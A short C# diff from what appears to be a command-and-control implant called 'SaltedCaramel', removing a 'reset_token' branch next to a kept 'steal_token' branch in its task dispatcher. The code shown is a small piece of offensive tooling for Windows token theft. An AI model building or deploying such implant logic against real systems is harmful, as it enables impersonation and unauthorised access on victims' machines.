@@ -118,11 +118,6 @@ namespace SaltedCaramel
                 Debug.WriteLine("[-] DispatchTask - Tasked to steal token");
                 Token.StealToken(this, implant);
             }
-            else if (this.command == "reset_token")
-            {
-                Debug.WriteLine("[-] DispatchTask - Tasked to revert token");
-                Token.stolenHandle = IntPtr.Zero;
-            }
         }
     }
 }
